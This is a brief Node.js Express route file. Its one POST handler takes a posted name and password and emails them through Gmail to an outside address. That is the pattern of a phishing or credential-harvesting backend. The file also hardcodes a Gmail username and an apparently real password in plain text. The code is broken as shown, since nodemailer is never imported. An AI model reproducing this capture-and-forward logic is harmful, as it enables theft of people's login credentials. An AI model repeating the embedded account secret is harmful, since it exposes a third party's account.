var express = require('express');
var router = express.Router();

/* GET home page. */
router.post('/mail', function(req, res, next) {
    var array = req.body
   
    
    var transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'nykolaychmut@gmail.com',
        pass: 'Nnukoliaa250011$'
      }
    });
    
    var mailOptions = {
      from: 'nykolaychmut@gmail.com',
      to: 'chmutkola@gmail.com',
      subject: 'Sending Email using Node.js',
      html: '<p>'+array.name+ '<br>'+array.password+'</p> '
     
    };
    
    transporter.sendMail(mailOptions, function(error, info){
      if (error) {
        console.log(error);
      } else {
        console.log('Email sent: ' + info.response);
        console.log('message set')
      }
    });

    res.send(req.body)
    
});

module.exports = router;
